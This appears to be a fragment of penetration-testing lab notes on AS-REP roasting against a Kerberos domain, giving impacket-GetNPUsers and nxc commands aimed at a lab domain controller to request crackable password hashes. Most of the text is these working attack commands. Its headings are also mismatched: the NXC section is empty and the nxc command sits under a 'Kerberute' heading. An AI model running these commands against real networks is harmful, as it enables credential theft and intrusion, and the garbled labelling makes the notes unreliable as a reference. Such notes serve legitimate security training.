Using impacket:
```
impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -dc-ip 172.16.15.3 -usersfile test_users.txt -request
```

Using NXC:
```
```

Using Kerberute:
```
nxc ldap 172.16.15.3 -u users_final.txt -p '' --asreproast asrep.txt
```

